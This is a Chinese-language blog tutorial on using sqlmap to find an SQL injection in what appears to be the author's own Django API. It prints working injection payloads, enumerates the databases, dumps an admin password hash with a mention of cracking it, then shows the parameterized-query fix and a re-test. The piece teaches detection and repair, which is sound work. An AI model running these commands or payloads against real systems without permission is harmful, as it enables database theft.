---
layout: post
title: "使用SQLMAP进行SQL注入实战"
date: 2019-04-19 20:00:00
author: "Johan Niu"
header-img : "img/post-bg-os-metro.jpg"
tags:
    - 攻击工具
    - 安全
    - Python
       
---


# 使用Sqlmap进行SQL注入实战

## 1 安装sqlmap

http://sqlmap.org/


	mkvirtualenv -p python3 sec
	
	git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
	
cd 目录，查看使用方法

	python sqlmap.py -hh
	

	
	
## 2 使用sqlmap

### 2.1 查看使用文档 -h/-hh
	
	(sec) ╭─didi@niu ~/workspace/virtualenv/sec/sqlmap-dev ‹master*›
	╰─$ python sqlmap.py -hh
	        ___
	       __H__
	 ___ ___[.]_____ ___ ___  {1.3.8.12#dev}
	|_ -| . ["]     | .'| . |
	|___|_  [)]_|_|_|__,|  _|
	      |_|V...       |_|   http://sqlmap.org
	
	Usage: python sqlmap.py [options]
	
	Options:
	  -h, --help            Show basic help message and exit
	  -hh                   Show advanced help message and exit
	  --version             Show program's version number and exit
	  -v VERBOSE            Verbosity level: 0-6 (default 1)
	
	  Target:
	    At least one of these options has to be provided to define the
	    target(s)
	
	    -d DIRECT           Connection string for direct database connection
	    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
	    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
	    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file
	    -m BULKFILE         Scan multiple targets given in a textual file
	    -r REQUESTFILE      Load HTTP request from a file
	    -g GOOGLEDORK       Process Google dork results as target URLs
	    -c CONFIGFILE       Load options from a configuration INI file
	
	  Request:
	    These options can be used to specify how to connect to the target URL
	
	    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
	    --data=DATA         Data string to be sent through POST (e.g. "id=1")
	    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
	    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
	    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
	    --load-cookies=L..  File containing cookies in Netscape/wget format
	    --drop-set-cookie   Ignore Set-Cookie header from response
	    --user-agent=AGENT  HTTP User-Agent header value
	    --mobile            Imitate smartphone through HTTP User-Agent header
	    --random-agent      Use randomly selected HTTP User-Agent header value
	    --host=HOST         HTTP Host header value
	    --referer=REFERER   HTTP Referer header value
	    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
	    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
	    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
	    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
	    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
	    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)
	    --ignore-proxy      Ignore system default proxy settings
	    --ignore-redirects  Ignore redirection attempts
	    --ignore-timeouts   Ignore connection timeouts
	    --proxy=PROXY       Use a proxy to connect to the target URL
	    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
	    --proxy-file=PRO..  Load proxy list from a file
	    --tor               Use Tor anonymity network
	    --tor-port=TORPORT  Set Tor proxy port other than default
	    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
	    --check-tor         Check to see if Tor is used properly
	    --delay=DELAY       Delay in seconds between each HTTP request
	    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
	    --retries=RETRIES   Retries when the connection timeouts (default 3)
	    --randomize=RPARAM  Randomly change value for given parameter(s)
	    --safe-url=SAFEURL  URL address to visit frequently during testing
	    --safe-post=SAFE..  POST data to send to a safe URL
	    --safe-req=SAFER..  Load safe HTTP request from a file
	    --safe-freq=SAFE..  Test requests between two visits to a given safe URL
	    --skip-urlencode    Skip URL encoding of payload data
	    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
	    --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token
	    --force-ssl         Force usage of SSL/HTTPS
	    --chunked           Use HTTP chunked transfer encoded (POST) requests
	    --hpp               Use HTTP parameter pollution method
	    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
	                        "import hashlib;id2=hashlib.md5(id).hexdigest()")
	
	  Optimization:
	    These options can be used to optimize the performance of sqlmap
	
	    -o                  Turn on all optimization switches
	    --predict-output    Predict common queries output
	    --keep-alive        Use persistent HTTP(s) connections
	    --null-connection   Retrieve page length without actual HTTP response body
	    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
	
	  Injection:
	    These options can be used to specify which parameters to test for,
	    provide custom injection payloads and optional tampering scripts
	
	    -p TESTPARAMETER    Testable parameter(s)
	    --skip=SKIP         Skip testing for given parameter(s)
	    --skip-static       Skip testing parameters that not appear to be dynamic
	    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")
	    --param-filter=P..  Select testable parameter(s) by place (e.g. "POST")
	    --dbms=DBMS         Force back-end DBMS to provided value
	    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
	    --os=OS             Force back-end DBMS operating system to provided value
	    --invalid-bignum    Use big numbers for invalidating values
	    --invalid-logical   Use logical operations for invalidating values
	    --invalid-string    Use random strings for invalidating values
	    --no-cast           Turn off payload casting mechanism
	    --no-escape         Turn off string escaping mechanism
	    --prefix=PREFIX     Injection payload prefix string
	    --suffix=SUFFIX     Injection payload suffix string
	    --tamper=TAMPER     Use given script(s) for tampering injection data
	
	  Detection:
	    These options can be used to customize the detection phase
	
	    --level=LEVEL       Level of tests to perform (1-5, default 1)
	    --risk=RISK         Risk of tests to perform (1-3, default 1)
	    --string=STRING     String to match when query is evaluated to True
	    --not-string=NOT..  String to match when query is evaluated to False
	    --regexp=REGEXP     Regexp to match when query is evaluated to True
	    --code=CODE         HTTP code to match when query is evaluated to True
	    --smart             Perform thorough tests only if positive heuristic(s)
	    --text-only         Compare pages based only on the textual content
	    --titles            Compare pages based only on their titles
	
	  Techniques:
	    These options can be used to tweak testing of specific SQL injection
	    techniques
	
	    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
	    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
	    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
	    --union-char=UCHAR  Character to use for bruteforcing number of columns
	    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
	    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
	    --second-url=SEC..  Resulting page URL searched for second-order response
	    --second-req=SEC..  Load second-order HTTP request from file
	
	  Fingerprint:
	    -f, --fingerprint   Perform an extensive DBMS version fingerprint
	
	  Enumeration:
	    These options can be used to enumerate the back-end database
	    management system information, structure and data contained in the
	    tables. Moreover you can run your own SQL statements
	
	    -a, --all           Retrieve everything
	    -b, --banner        Retrieve DBMS banner
	    --current-user      Retrieve DBMS current user
	    --current-db        Retrieve DBMS current database
	    --hostname          Retrieve DBMS server hostname
	    --is-dba            Detect if the DBMS current user is DBA
	    --users             Enumerate DBMS users
	    --passwords         Enumerate DBMS users password hashes
	    --privileges        Enumerate DBMS users privileges
	    --roles             Enumerate DBMS users roles
	    --dbs               Enumerate DBMS databases
	    --tables            Enumerate DBMS database tables
	    --columns           Enumerate DBMS database table columns
	    --schema            Enumerate DBMS schema
	    --count             Retrieve number of entries for table(s)
	    --dump              Dump DBMS database table entries
	    --dump-all          Dump all DBMS databases tables entries
	    --search            Search column(s), table(s) and/or database name(s)
	    --comments          Check for DBMS comments during enumeration
	    --statements        Retrieve SQL statements being run on DBMS
	    -D DB               DBMS database to enumerate
	    -T TBL              DBMS database table(s) to enumerate
	    -C COL              DBMS database table column(s) to enumerate
	    -X EXCLUDE          DBMS database identifier(s) to not enumerate
	    -U USER             DBMS user to enumerate
	    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
	    --pivot-column=P..  Pivot column name
	    --where=DUMPWHERE   Use WHERE condition while table dumping
	    --start=LIMITSTART  First dump table entry to retrieve
	    --stop=LIMITSTOP    Last dump table entry to retrieve
	    --first=FIRSTCHAR   First query output word character to retrieve
	    --last=LASTCHAR     Last query output word character to retrieve
	    --sql-query=SQLQ..  SQL statement to be executed
	    --sql-shell         Prompt for an interactive SQL shell
	    --sql-file=SQLFILE  Execute SQL statements from given file(s)
	
	  Brute force:
	    These options can be used to run brute force checks
	
	    --common-tables     Check existence of common tables
	    --common-columns    Check existence of common columns
	    --common-files      Check existence of common files
	
	  User-defined function injection:
	    These options can be used to create custom user-defined functions
	
	    --udf-inject        Inject custom user-defined functions
	    --shared-lib=SHLIB  Local path of the shared library
	
	  File system access:
	    These options can be used to access the back-end database management
	    system underlying file system
	
	    --file-read=FILE..  Read a file from the back-end DBMS file system
	    --file-write=FIL..  Write a local file on the back-end DBMS file system
	    --file-dest=FILE..  Back-end DBMS absolute filepath to write to
	
	  Operating system access:
	    These options can be used to access the back-end database management
	    system underlying operating system
	
	    --os-cmd=OSCMD      Execute an operating system command
	    --os-shell          Prompt for an interactive operating system shell
	    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
	    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or 
	    xxx
	    ...
	    ...
	    ...
    
### 2.2 指到注入目标 -u 

	-u URL, --url=URL 
	
-u 后接url，查看是否有可注入点，例如：

	python sqlmap.py -u http://172.20.201.203:9000/apis/dashboard/typetopcount\?method\=POST\&topCount\=3

	[11:26:38] [WARNING] GET parameter 'topCount' does not seem to be injectable
	sqlmap identified the following injection point(s) with a total of 3138 HTTP(s) requests:
	---
	Parameter: method (GET)
	    Type: boolean-based blind
	    Title: AND boolean-based blind - WHERE or HAVING clause
	    Payload: method=POST' AND 5176=5176 AND 'EvFC'='EvFC&topCount=3
	
	    Type: error-based
	    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
	    Payload: method=POST' AND (SELECT 2244 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(2244=2244,1))),0x7170717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CWNF'='CWNF&topCount=3
	
	    Type: time-based blind
	    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
	    Payload: method=POST' AND (SELECT 8526 FROM (SELECT(SLEEP(5)))yhHi) AND 'Djtf'='Djtf&topCount=3
	
	    Type: UNION query
	    Title: Generic UNION query (NULL) - 2 columns
	    Payload: method=POST' UNION ALL SELECT CONCAT(0x716a7a6b71,0x685773786e4b6578754b534c4a79487979684b46586a77546d6a69656677786e7748474a4a746177,0x7170717871),NULL-- rehY&topCount=3
	---
	[11:26:38] [INFO] the back-end DBMS is MySQL
	back-end DBMS: MySQL >= 5.0
	[11:26:38] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
	

### 2.3 获取数据库 --dbs --current-db

`--dbs` 列出所有数据库

`--current-db` 当前数据库


	[11:46:17] [INFO] the back-end DBMS is MySQL
	back-end DBMS: MySQL >= 5.0
	[11:46:17] [INFO] fetching current database
	current database: 'itapidb'
	[11:46:17] [INFO] fetching database names
	available databases [16]:
	[*] db_platform
	[*] information_schema
	[*] itapidb
	[*] mysql
	[*] performance_schema
	[*] sys
	[*] tests
	...
	...
	
	[11:46:17] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
	


### 2.4 查询数据库的表 --tables

`-D '数据库' --tables`

	python sqlmap.py -u http://172.20.201.203:9000/apis/dashboard/typetopcount\?method\=POST\&topCount\=3 -D 'itapidb' --tables
	
	[14:17:31] [INFO] the back-end DBMS is MySQL
	back-end DBMS: MySQL >= 5.0
	[14:17:31] [INFO] fetching tables for database: 'itapidb'
	Database: itapidb
	[36 tables]
	+---------------------------------------+
	| apis_basemailgroupmodel               |
	| apis_basemailmodel                    |
	...
	...
	| apis_depmailjobmodel                  |
	| apis_mailcapacitionmodel              |
	| apis_mailgroupcreatemodel             |
	...
	...
	| auth_group                            |
	| auth_group_permissions                |
	| auth_permission                       |
	| auth_user                             |
	| auth_user_groups                      |
	| auth_user_user_permissions            |
	| django_admin_log                      |
	| django_content_type                   |
	| django_migrations                     |
	...
	...
	| supervision_apismodel                 |
	+---------------------------------------+
	
	[14:17:31] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
	

### 2.5 查询表的数据项 --columns

	python sqlmap.py -u http://172.20.201.203:9000/apis/dashboard/typetopcount\?method\=POST\&topCount\=3 -D 'itapidb' -T 'auth_user' --columns

	[14:19:45] [INFO] the back-end DBMS is MySQL
	back-end DBMS: MySQL >= 5.0
	[14:19:45] [INFO] fetching columns for table 'auth_user' in database 'itapidb'
	Database: itapidb
	Table: auth_user
	[11 columns]
	+--------------+--------------+
	| Column       | Type         |
	+--------------+--------------+
	| date_joined  | datetime(6)  |
	| email        | varchar(254) |
	| first_name   | varchar(30)  |
	| id           | int(11)      |
	| is_active    | tinyint(1)   |
	| is_staff     | tinyint(1)   |
	| is_superuser | tinyint(1)   |
	| last_login   | datetime(6)  |
	| last_name    | varchar(150) |
	| password     | varchar(128) |
	| username     | varchar(150) |
	+--------------+--------------+
	
	[14:19:45] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
	

### 2.6 查询数据库用户与密码 --users --passwords

	python sqlmap.py -u http://172.20.201.203:9000/apis/dashboard/typetopcount\?method\=POST\&topCount\=3 --users

	[14:21:05] [INFO] fetching database users
	database management system users [1]:
	[*] 'db_itapi_dpl'@'%'
	
	[14:21:05] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
	
	

### 2.7 获取数据库表内容 --dump

	python sqlmap.py -u http://172.20.201.203:9000/apis/dashboard/typetopcount\?method\=POST\&topCount\=3 -D 'itapidb' -T 'auth_user' --dump
	        ___
	       __H__
	 ___ ___[.]_____ ___ ___  {1.3.8.12#dev}
	|_ -| . [.]     | .'| . |
	|___|_  ["]_|_|_|__,|  _|
	      |_|V...       |_|   http://sqlmap.org
	
	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
	
	
	[14:26:10] [INFO] resuming back-end DBMS 'mysql'
	[14:26:10] [INFO] testing connection to the target URL
	sqlmap resumed the following injection point(s) from stored session:
	---
	Parameter: method (GET)
	    Type: boolean-based blind
	    Title: AND boolean-based blind - WHERE or HAVING clause
	    Payload: method=POST' AND 5176=5176 AND 'EvFC'='EvFC&topCount=3
	
	    Type: error-based
	    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
	    Payload: method=POST' AND (SELECT 2244 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(2244=2244,1))),0x7170717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CWNF'='CWNF&topCount=3
	
	    Type: time-based blind
	    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
	    Payload: method=POST' AND (SELECT 8526 FROM (SELECT(SLEEP(5)))yhHi) AND 'Djtf'='Djtf&topCount=3
	
	    Type: UNION query
	    Title: Generic UNION query (NULL) - 2 columns
	    Payload: method=POST' UNION ALL SELECT CONCAT(0x716a7a6b71,0x685773786e4b6578754b534c4a79487979684b46586a77546d6a69656677786e7748474a4a746177,0x7170717871),NULL-- rehY&topCount=3
	---
	[14:26:10] [INFO] the back-end DBMS is MySQL
	back-end DBMS: MySQL >= 5.0
	[14:26:10] [INFO] fetching columns for table 'auth_user' in database 'itapidb'
	[14:26:10] [INFO] fetching entries for table 'auth_user' in database 'itapidb'
	Database: itapidb
	Table: auth_user
	[1 entry]
	+----+---------+----------+--------------------------------------------------------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
	| id | email   | is_staff | password                                                                       | username | is_active | last_name | first_name | last_login                 | date_joined                | is_superuser |
	+----+---------+----------+--------------------------------------------------------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
	| 1  | <blank> | 1        | pbkdf2_sha256$150000$lxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | admin    | 1         | <blank>   | <blank>    | 2018-04-14 18:16:53.846708 | 2018-03-26 11:56:54.734852 | 1            |
	+----+---------+----------+--------------------------------------------------------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
	
	[14:26:11] [INFO] table 'itapidb.auth_user' dumped to CSV file '/Users/didi/.sqlmap/output/172.20.201.203/dump/itapidb/auth_user.csv'
	[14:26:11] [INFO] fetched data logged to text files under '/Users/didi/.sqlmap/output/172.20.201.203'
	
	
这里密码做了隐藏，将表的内容dump下来，发现存在`admin`用户，密码是经过`Django` `pbkdf2_sha256`加密的。可以通过Django的加密，对比进行密码破解。

### Sqlmap 更多命令

可以参考一个博客：

[https://vul-hunters.oschina.io/hunter-blogs/posts/sec-tools-sqlmap/]()

## 3 漏洞分析

源代码：

	class ApisRecordView(APIView):
		def get(self,request,*args,**kwargs):
			#sqlcmd = "SELECT * FROM rest_framework_tracking_apirequestlog where status_code != 200"
			queryMinId = int(self.request.query_params.get('queryMinId'))
			queryMaxId = int(self.request.query_params.get('queryMaxId'))
			hasIdNumber = int(self.request.query_params.get('hasIdNumber'))
			eachQueryNumber = int(self.request.query_params.get('eachQueryNumber'))
			queryMethod = self.request.query_params.get('method')
			SqlQuertUp = "SELECT * FROM rest_framework_tracking_apirequestlog where method = %s AND id > %s ORDER BY id DESC"
			
			sqlQueryNewestRecords = dbOperate.execute(SqlQuertUp,[queryMethod,queryMinId])
			if(sqlQueryNewestRecords) :
				queryMinId = sqlQueryNewestRecords[0]["id"]

			xxx
			return response

	class ApisDashboardViewSet(viewsets.ModelViewSet):
		queryset = ApisModel.objects.all()
		serializer_class = ApisSerializer

		@action(detail=False, methods=['GET'], url_path='frequency', url_name="dashboard_frequency")
		def frequency(self,request, *args, **kwargs) :
			contentList = []
			queryMethod = self.request.query_params.get('method')
			topCount = self.request.query_params.get('topCount')
			sqlQueryTopCount = "SELECT path as itemPath, count(*) as count from rest_framework_tracking_apirequestlog  WHERE method = '{0}' GROUP BY path ORDER BY count DESC LIMIT {1};".format(queryMethod,topCount)
			sqlExecResult = dbmodel().execute(sqlQueryTopCount)
			if(sqlExecResult) :
				contentList = sqlExecResult
			xxxxx
			return response

		@action(detail=False, methods=['GET'], url_path='typetopcount', url_name="dashboard_typetopcount")
		def typetopcount(self,request, *args, **kwargs) :
			contentList = []
			queryMethod = self.request.query_params.get('method')
			topCount = self.request.query_params.get('topCount')
			sqlQueryMailTopCount = "SELECT path as itemPath, count(*) as count FROM rest_framework_tracking_apirequestlog where method = '{0}' AND path REGEXP '^/mail/' GROUP BY path ORDER BY count DESC LIMIT {1};".format(queryMethod,topCount)
			dbOperate = dbmodel()
			sqlExecMailResult = dbOperate.execute(sqlQueryMailTopCount)
			if(sqlExecMailResult) :
				for itemDict in sqlExecMailResult :
					itemDict['apiType'] = "邮箱"	
			xxxxx
			
			return response

有问题是后两个action，后面两个SQL查询使用 


	SQLcmd = "{0} {1}".format(args1,args2)
	db.execute(SQLcmd)
 	
 没有使用Django ORM
 
## 4 漏洞修复
 
 按照`Django ORM`形式执行SQL命令，正如 action 1 ：
 
 
	SQLcmd = "%s %s"
	db.execute(SQLcmd,[args1,args2])
 	
 
**注意注意**：
 
 如果参数是整数，必须换成整数，不然汇报如下错误：
 
 
	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near  at line 1
 	
 	
 原因在于：
 
 `limit` 后必须跟整数，但是浏览器get传输的 `topCount` 是字符串，所以必须要：
 
 	
	topCount = int(self.request.query_params.get('topCount'))
 
 
修复后代码：

	class ApisRecordView(APIView):
		def get(self,request,*args,**kwargs):
			#sqlcmd = "SELECT * FROM rest_framework_tracking_apirequestlog where status_code != 200"
			queryMinId = int(self.request.query_params.get('queryMinId'))
			queryMaxId = int(self.request.query_params.get('queryMaxId'))
			hasIdNumber = int(self.request.query_params.get('hasIdNumber'))
			eachQueryNumber = int(self.request.query_params.get('eachQueryNumber'))
			queryMethod = self.request.query_params.get('method')
			SqlQuertUp = "SELECT * FROM rest_framework_tracking_apirequestlog where method = %s AND id > %s ORDER BY id DESC"
			
			sqlQueryNewestRecords = dbOperate.execute(SqlQuertUp,[queryMethod,queryMinId])
			if(sqlQueryNewestRecords) :
				queryMinId = sqlQueryNewestRecords[0]["id"]

			xxx
			return response

	class ApisDashboardViewSet(viewsets.ModelViewSet):
		queryset = ApisModel.objects.all()
		serializer_class = ApisSerializer

		@action(detail=False, methods=['GET'], url_path='frequency', url_name="dashboard_frequency")
		def frequency(self,request, *args, **kwargs) :
			contentList = []
			queryMethod = self.request.query_params.get('method')
			topCount = int(self.request.query_params.get('topCount'))
			sqlQueryTopCount = "SELECT path as itemPath, count(*) as count from rest_framework_tracking_apirequestlog  WHERE method = %s GROUP BY path ORDER BY count DESC LIMIT %s;"
			sqlExecResult = dbmodel().execute(sqlQueryTopCount,[queryMethod, topCount])
			if(sqlExecResult) :
				contentList = sqlExecResult
			xxxxx
			return response

		@action(detail=False, methods=['GET'], url_path='typetopcount', url_name="dashboard_typetopcount")
		def typetopcount(self,request, *args, **kwargs) :
			contentList = []
			queryMethod = self.request.query_params.get('method')
			topCount = int(self.request.query_params.get('topCount'))
			sqlQueryMailTopCount = "SELECT path as itemPath, count(*) as count FROM rest_framework_tracking_apirequestlog where method = %s AND path REGEXP '^/mail/' GROUP BY path ORDER BY count DESC LIMIT %s;"
			dbOperate = dbmodel()
			sqlExecMailResult = dbOperate.execute(sqlQueryMailTopCount, [queryMethod, topCount])
			if(sqlExecMailResult) :
				for itemDict in sqlExecMailResult :
					itemDict['apiType'] = "邮箱"	
			xxxxx
			
			return response
			
##  5 修复后再验证

### 首先清除上次`SQLmap`的缓存：
方法一：使用`--flush-session` `--fresh-queries`

方法二：直接删除`sqlmap` `output`文件夹下的`对应的IP`目录

	python sqlmap.py -u http://172.20.201.203:9000/apis/dashboard/typetopcount\?method\=POST\&topCount\=3 --flush-session --fresh-queries

### 检验是否修复成功

	python sqlmap.py -u http://172.20.201.203:9000/apis/dashboard/typetopcount\?method\=POST\&topCount\=3 -v 3 --threads=4
	
	[17:54:29] [WARNING] GET parameter 'topCount' does not seem to be injectable
	[17:54:29] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

可以看到，目前并没有探测到SQL注入点，将`level`、`risk`设为最大，再次探测：

	[18:24:11] [WARNING] parameter 'topCount' does not seem to be injectable
	[18:24:11] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

可以发现，已经探测不出来了。证明修复成功。



